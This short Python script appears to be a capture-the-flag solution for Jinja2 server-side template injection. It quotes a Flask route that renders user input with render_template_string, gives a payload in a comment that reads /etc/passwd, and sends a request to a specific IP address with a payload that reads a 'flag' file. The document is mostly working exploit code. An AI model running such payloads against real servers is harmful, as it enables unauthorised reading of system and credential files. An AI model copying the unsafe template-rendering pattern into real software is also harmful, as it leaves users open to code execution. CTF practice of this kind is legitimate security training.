"""
app = Flask(__name__)
@app.route("/")

def home():

        output = request.args.get('name')

        output = render_template_string(output)

        if output:

                pass

        else:

                output = "What's your name? Part 2"

 [Open an interactive python shell in this frame]         return output
"""
# jinja2 template injection, you can search for the payload on google
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection
# {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
import requests
host = "http://34.159.73.134:30596/?name="
payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag').read() }}"
url = host + payload
response = requests.get(url)
print(response.text)